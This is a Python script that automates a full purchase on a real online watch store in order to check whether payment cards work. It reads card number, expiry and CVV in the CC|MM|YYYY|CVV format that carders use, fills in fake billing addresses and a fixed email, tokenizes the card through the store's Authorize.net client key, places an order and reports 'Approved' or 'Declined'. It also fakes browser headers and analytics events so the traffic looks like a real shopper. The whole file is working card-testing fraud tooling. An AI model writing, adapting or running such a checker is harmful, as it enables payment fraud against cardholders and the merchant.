import requests
import random
import time
import re
import json
import uuid
from urllib.parse import quote

class SarasotaWatchAutomation:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://sarasotawatch.com"
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        
        self.base_headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        self.email = "wasdark336@gmail.com"
        self.nonce = None
        self.security = None
        self.product_referer = f"{self.base_url}/products/"
        
    def get_random_address(self):
        """Get a random fake address from the provided list"""
        addresses = [
            {
                'name': 'Daniel Thomas',
                'street': '7764 Gallagher Courts',
                'address_2': 'Apt. 994',
                'city': 'West Gwendolynfort',
                'state': 'IA',
                'state_full': 'Iowa',
                'postcode': '01501',
                'phone': '6113571363'
            },
            {
                'name': 'David Williams',
                'street': '57752 Madison Lights',
                'address_2': 'Suite 476',
                'city': 'Lake Jonathan',
                'state': 'VT',
                'state_full': 'Vermont',
                'postcode': '26618',
                'phone': '0015762393384'
            },
            {
                'name': 'Michelle Willis',
                'street': '6032 Leslie Pike',
                'address_2': 'Apt. 072',
                'city': 'Lake Marioshire',
                'state': 'WI',
                'state_full': 'Wisconsin',
                'postcode': '54680',
                'phone': '6902751715'
            },
            {
                'name': 'Zachary Parker',
                'street': '96842 Amy Forge',
                'address_2': 'Suite 475',
                'city': 'North Jack',
                'state': 'IN',
                'state_full': 'Indiana',
                'postcode': '64605',
                'phone': '7507213143'
            }
        ]
        return random.choice(addresses)
    
    def fetch_valid_product(self):
        """Dynamically fetch a valid product from the site"""
        try:
            # Visit products page
            r = self.session.get(f"{self.base_url}/products/", headers=self.base_headers)
            if r.status_code != 200:
                return None
            
            # Find product links
            product_links = list(set(re.findall(r'href="(https://sarasotawatch\.com/product/[^"]+)"', r.text)))
            if not product_links:
                return None
            
            # Pick a random product and visit its page
            product_url = random.choice(product_links)
            r2 = self.session.get(product_url, headers=self.base_headers)
            if r2.status_code != 200:
                return None
            
            # Extract product ID from add-to-cart button
            atc_match = re.findall(r'name="add-to-cart" value="(\d+)"', r2.text)
            if not atc_match:
                return None
            
            product_id = atc_match[0]
            
            # Extract SKU
            sku_match = re.findall(r'class="sku"[^>]*>([^<]+)<', r2.text)
            product_sku = sku_match[0].strip() if sku_match else ''
            
            # Store referer for add-to-cart
            self.product_referer = product_url
            
            return {'id': product_id, 'sku': product_sku}
        except Exception as e:
            return None
    
    def get_card_details(self):
        """Get card details from user input"""
        print("Enter card details in format: CC|MM|YYYY|CVV")
        card_input = input("Card details: ").strip()
        
        try:
            cc, mm, yyyy, cvv = card_input.split('|')
            return {
                'card_number': cc.strip(),
                'exp_month': mm.strip(),
                'exp_year': yyyy.strip(),
                'cvv': cvv.strip(),
                'expiration_date': f"{mm}{yyyy[-2:]}"
            }
        except ValueError:
            print("Invalid format! Please use: CC|MM|YYYY|CVV")
            return self.get_card_details()
    
    def extract_nonce_and_security(self, html_content):
        """Extract nonce and security values from HTML"""
        # Extract woocommerce-process-checkout-nonce
        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', html_content)
        if nonce_match:
            self.nonce = nonce_match.group(1)
        
        # Extract security token for update_order_review
        security_match = re.search(r'"update_order_review_nonce":"([^"]+)"', html_content)
        if security_match:
            self.security = security_match.group(1)
        
        return self.nonce is not None and self.security is not None
    
    def send_analytics_event(self, product_id):
        """Send analytics event for product click"""
        url = 'https://analytics.ahrefs.com/api/event'
        headers = {
            **self.base_headers,
            'accept': '*/*',
            'content-type': 'text/plain',
            'origin': 'https://sarasotawatch.com',
            'priority': 'u=4, i',
            'referer': 'https://sarasotawatch.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'no-cors',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-storage-access': 'active'
        }
        
        data = {
            "n": "x-link-click",
            "u": "https://sarasotawatch.com/products/",
            "l": ["en-US","en"],
            "k": "CcDnv5NcsINnL6LDSqg1XA",
            "r": "https://sarasotawatch.com/",
            "m": '{"metaKey":"false","ctrlKey":"false","shiftKey":"false"}',
            "p": f'{{"href":"https://sarasotawatch.com/wp-admin/admin-ajax.php?add-to-cart={product_id}"}}',
            "sw": 1536,
            "sh": 864,
            "sr": 1.25,
            "t": "Products - Sarasota Watches"
        }
        
        try:
            response = requests.post(url, headers=headers, json=data)
        except Exception:
            pass
    
    def add_to_cart(self, product_id, product_sku, quantity=1):
        """Add product to cart"""
        # Send analytics event first
        self.send_analytics_event(product_id)
        
        # Add to cart request
        url = f'{self.base_url}/?wc-ajax=add_to_cart'
        headers = {
            **self.base_headers,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': self.product_referer,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        data = {
            'product_sku': product_sku,
            'product_id': product_id,
            'quantity': quantity
        }
        
        response = self.session.post(url, headers=headers, data=data)
        
        if response.status_code == 200:
            try:
                resp_json = response.json()
                if resp_json.get('error'):
                    return False
            except:
                pass
            # Update cart fragments
            self.update_cart_fragments()
            return True
        
        return False
    
    def update_cart_fragments(self):
        """Update cart fragments"""
        url = f'{self.base_url}/wp-admin/admin-ajax.php'
        headers = {
            **self.base_headers,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/products/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        data = {
            'action': 'elementor_menu_cart_fragments',
            'templates[]': ['69', '112', '282', '385', '3496', '26635', '26738'],
            '_nonce': '020e2b6a29',
            'is_editor': 'false'
        }
        
        try:
            self.session.post(url, headers=headers, data=data)
        except Exception:
            pass
    
    def navigate_to_checkout(self):
        """Navigate to checkout page and extract nonce/security"""
        url = f'{self.base_url}/checkout/'
        headers = {
            **self.base_headers,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'priority': 'u=1, i',
            'purpose': 'prefetch',
            'referer': f'{self.base_url}/products/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-purpose': 'prefetch',
            'upgrade-insecure-requests': '1'
        }
        
        response = self.session.get(url, headers=headers)
        
        if response.status_code == 200:
            # Extract nonce and security from checkout page
            return self.extract_nonce_and_security(response.text)
        
        return False
    
    def update_order_review(self, address, card_details):
        """Update order review with address and payment details"""
        url = f'{self.base_url}/?wc-ajax=update_order_review'
        headers = {
            **self.base_headers,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/checkout/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        # Prepare address data
        first_name, last_name = address['name'].split(' ', 1)
        
        # Create the post_data string
        post_data = (
            f"billing_first_name={first_name}"
            f"&billing_last_name={last_name}"
            f"&billing_company="
            f"&billing_country=US"
            f"&billing_address_1={quote(address['street'])}"
            f"&billing_address_2={quote(address.get('address_2', ''))}"
            f"&billing_city={quote(address['city'])}"
            f"&billing_state={address['state']}"
            f"&billing_postcode={address['postcode']}"
            f"&billing_phone={address['phone']}"
            f"&billing_email={self.email}"
            f"&shipping_first_name={first_name}"
            f"&shipping_last_name={last_name}"
            f"&shipping_company="
            f"&shipping_country=US"
            f"&shipping_address_1={quote(address['street'])}"
            f"&shipping_address_2={quote(address.get('address_2', ''))}"
            f"&shipping_city={quote(address['city'])}"
            f"&shipping_state={address['state']}"
            f"&shipping_postcode={address['postcode']}"
            f"&shipping_phone={address['phone']}"
            f"&order_comments="
            f"&shipping_method[0]=free_shipping:1"
            f"&coupon_code="
            f"&payment_method=authorize_net_cim_credit_card"
            f"&wc-authorize-net-cim-credit-card-context=shortcode"
            f"&wc-authorize-net-cim-credit-card-expiry="
            f"&wc-authorize-net-cim-credit-card-payment-nonce="
            f"&wc-authorize-net-cim-credit-card-payment-descriptor="
            f"&wc-authorize-net-cim-credit-card-last-four="
            f"&wc-authorize-net-cim-credit-card-card-type="
            f"&terms-field=1"
            f"&woocommerce-process-checkout-nonce={self.nonce}"
            f"&_wp_http_referer={quote('/checkout/')}"
        )
        
        data = {
            'security': self.security if self.security else '329115a2b9',
            'payment_method': 'authorize_net_cim_credit_card',
            'country': 'US',
            'state': address['state'],
            'postcode': address['postcode'],
            'city': address['city'],
            'address': address['street'],
            'address_2': address.get('address_2', ''),
            's_country': 'US',
            's_state': address['state'],
            's_postcode': address['postcode'],
            's_city': address['city'],
            's_address': address['street'],
            's_address_2': address.get('address_2', ''),
            'has_full_address': 'true',
            'post_data': post_data,
            'shipping_method[0]': 'free_shipping:1'
        }
        
        response = self.session.post(url, headers=headers, data=data)
        return response.status_code == 200
    
    def get_payment_token(self, card_details, address):
        """Get payment token from Authorize.net"""
        try:
            # Generate a new UUID for each request
            request_id = str(uuid.uuid4())
            
            # OPTIONS request first
            options_url = 'https://api2.authorize.net/xml/v1/request.api'
            options_headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Access-Control-Request-Headers': 'content-type',
                'Access-Control-Request-Method': 'POST',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/",
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': self.user_agent
            }
            
            requests.options(options_url, headers=options_headers)
            
            # Main token request
            url = 'https://api2.authorize.net/xml/v1/request.api'
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json; charset=UTF-8',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/",
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': self.user_agent
            }
            
            data = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": "3w6GjCvx5D",
                        "clientKey": "44kcf2qK4KDH5yf5EVjLgP3d92Kg4Je7XAvrw8DF2CD7xhRVA5u92pXXCz4sVz7a"
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": request_id,
                        "token": {
                            "cardNumber": card_details['card_number'],
                            "expirationDate": card_details['expiration_date'],
                            "cardCode": card_details['cvv'],
                            "zip": address['postcode'],
                            "fullName": address['name']
                        }
                    }
                }
            }
            
            response = requests.post(url, headers=headers, json=data)
            
            if response.status_code == 200:
                # Remove UTF-8 BOM if present
                response_text = response.text
                if response_text.startswith('\ufeff'):
                    response_text = response_text[1:]
                
                try:
                    token_data = json.loads(response_text)
                    
                    # Extract opaqueData
                    if 'opaqueData' in token_data:
                        opaque_data = token_data['opaqueData']
                        payment_token = opaque_data['dataValue']
                        return payment_token
                except:
                    return None
            return None
            
        except Exception:
            return None
    
    def process_checkout(self, address, card_details, payment_token):
        """Process the final checkout"""
        url = f'{self.base_url}/?wc-ajax=checkout'
        headers = {
            **self.base_headers,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/checkout/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        first_name, last_name = address['name'].split(' ', 1)
        
        data = {
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://sarasotawatch.com/products/',
            'wc_order_attribution_session_start_time': '2025-10-03 08:57:53',
            'wc_order_attribution_session_pages': '5',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': self.user_agent,
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': address['street'],
            'billing_address_2': address.get('address_2', ''),
            'billing_city': address['city'],
            'billing_state': address['state'],
            'billing_postcode': address['postcode'],
            'billing_phone': address['phone'],
            'billing_email': self.email,
            'shipping_first_name': first_name,
            'shipping_last_name': last_name,
            'shipping_company': '',
            'shipping_country': 'US',
            'shipping_address_1': address['street'],
            'shipping_address_2': address.get('address_2', ''),
            'shipping_city': address['city'],
            'shipping_state': address['state'],
            'shipping_postcode': address['postcode'],
            'shipping_phone': address['phone'],
            'order_comments': '',
            'shipping_method[0]': 'free_shipping:1',
            'coupon_code': '',
            'payment_method': 'authorize_net_cim_credit_card',
            'wc-authorize-net-cim-credit-card-context': 'shortcode',
            'wc-authorize-net-cim-credit-card-expiry': f"{card_details['exp_month']} / {card_details['exp_year'][-2:]}",
            'wc-authorize-net-cim-credit-card-payment-nonce': payment_token,
            'wc-authorize-net-cim-credit-card-payment-descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
            'wc-authorize-net-cim-credit-card-last-four': card_details['card_number'][-4:],
            'wc-authorize-net-cim-credit-card-card-type': 'visa',
            'terms': 'on',
            'terms-field': '1',
            'woocommerce-process-checkout-nonce': self.nonce,
            '_wp_http_referer': '/checkout/?elementorPageId=643&elementorWidgetId=ae90f2a'
        }
        
        response = self.session.post(url, headers=headers, data=data)
        
        try:
            return response.json()
        except:
            return {'result': 'failure', 'messages': 'Invalid JSON response'}
    
    def extract_message_from_response(self, messages):
        """Extract clean message from HTML response"""
        if not messages:
            return "No response message"
        
        # Remove HTML tags and clean up the message
        clean_message = re.sub('<[^<]+?>', '', messages)
        clean_message = re.sub(r'\s+', ' ', clean_message).strip()
        
        return clean_message
    
    def run_single_check(self):
        """Run single card check and show formatted response"""
        print("🚀 Sarasota Watch - Single Card Check")
        print("=" * 50)
        
        # Get card details
        card_details = self.get_card_details()
        
        # Dynamically fetch a valid product from the site
        print("\n🔍 Finding a valid product...")
        product = self.fetch_valid_product()
        if not product:
            return {"status": "Error", "response": "Failed to find a valid product on the site"}
        
        address = self.get_random_address()
        
        print(f"\n📦 Product: {product['id']}")
        print(f"🏠 Address: {address['name']}, {address['city']}")
        print(f"💳 Card: {card_details['card_number'][:6]}{'*' * (len(card_details['card_number']) - 10)}{card_details['card_number'][-4:]}")
        print(f"📧 Email: {self.email}")
        
        print("\n🔄 Processing...")
        
        try:
            # Step 1: Add product to cart
            if not self.add_to_cart(product['id'], product['sku']):
                return {"status": "Error", "response": "Failed to add product to cart"}
            
            time.sleep(2)
            
            # Step 2: Navigate to checkout and extract nonce
            if not self.navigate_to_checkout():
                return {"status": "Error", "response": "Failed to navigate to checkout"}
            
            time.sleep(2)
            
            # Step 3: Update order review
            if not self.update_order_review(address, card_details):
                return {"status": "Error", "response": "Failed to update order review"}
            
            time.sleep(2)
            
            # Step 4: Get payment token
            payment_token = self.get_payment_token(card_details, address)
            if not payment_token:
                return {"status": "Error", "response": "Failed to get payment token"}
            
            time.sleep(2)
            
            # Step 5: Process checkout
            result = self.process_checkout(address, card_details, payment_token)
            
            # Format the response
            if result.get('result') == 'success':
                return {
                    "status": "Approved", 
                    "response": "Payment successful! Order placed."
                }
            else:
                message = self.extract_message_from_response(result.get('messages', ''))
                return {
                    "status": "Declined",
                    "response": message
                }
                    
        except Exception as e:
            return {
                "status": "Error",
                "response": f"Processing error: {str(e)}"
            }

# Run the single check
if __name__ == "__main__":
    automation = SarasotaWatchAutomation()
    result = automation.run_single_check()
    
    print("\n" + "=" * 50)
    print("📊 FINAL RESULT:")
    print(f"response: \"{result['response']}\"")
    print(f"status: \"{result['status']}\"")
    print("=" * 50)